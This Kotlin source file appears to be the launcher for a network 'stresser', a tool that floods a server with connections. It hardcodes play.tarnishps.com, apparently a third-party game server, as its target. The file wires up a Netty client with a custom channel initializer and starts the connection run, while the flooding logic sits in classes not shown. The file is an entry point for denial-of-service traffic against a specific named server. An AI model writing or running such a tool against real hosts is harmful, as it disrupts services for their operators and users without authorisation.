package org.jire.netrune.stresser.tarnishps

import io.netty.bootstrap.Bootstrap
import io.netty.channel.ChannelHandler
import io.netty.channel.EventLoopGroup
import org.jire.netrune.net.client.netty4.DefaultClientBootstrapFactory
import org.jire.netrune.net.netty4.DefaultEventLoopGroupFactory
import org.jire.netrune.stresser.DefaultStresserTarget
import org.jire.netrune.stresser.Stresser
import org.jire.netrune.stresser.StresserTarget
import org.jire.netrune.stresser.netty4.Netty4Stresser

object TarnishPSStresser {

    private val TARGET: StresserTarget = DefaultStresserTarget("play.tarnishps.com")

    @JvmStatic
    fun main(args: Array<String>) {
        val handler: ChannelHandler = TarnishPSChannelInitializer()
        val group: EventLoopGroup = DefaultEventLoopGroupFactory.eventLoopGroup()
        val bootstrap: Bootstrap = DefaultClientBootstrapFactory.clientBootstrap(
            group,
            handler = handler
        )
        val stresser: Stresser = Netty4Stresser(
            TARGET,

            handler,

            group,
            bootstrap
        )
        stresser.connect()
    }

}